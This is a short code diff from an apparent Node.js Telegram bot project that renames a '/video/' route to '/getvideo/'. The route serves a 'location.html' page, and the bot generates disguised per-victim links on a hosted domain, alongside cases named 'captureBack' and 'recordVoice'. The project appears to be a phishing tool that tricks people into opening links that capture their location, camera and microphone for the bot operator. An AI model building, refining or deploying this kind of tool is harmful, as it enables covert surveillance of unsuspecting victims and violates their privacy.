@@ -235,7 +235,7 @@ app.get('/getNameForm', (req, res) => {
     res.sendFile(path.join(__dirname, fileName));
 });
 
-app.get('/video/:linkId', (req, res) => {
+app.get('/getvideo/:linkId', (req, res) => {
     const linkId = req.params.linkId;
     if (validateLinkUsage(linkId)) {
         res.sendFile(path.join(__dirname, 'location.html'));
@@ -776,8 +776,8 @@ bot.on('callback_query', async (callbackQuery) => {
             case 'captureBack':
                 link = `https://i-jgne.onrender.com/captureBack/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
                 break;
-            case 'video':
-                link = `https://i-jgne.onrender.com/video/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
+            case 'getvideo':
+                link = `https://i-jgne.onrender.com/getvideo/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
                 break;
             case 'recordVoice':
                 const duration = 10;  // مدة التسجيل الثابتة
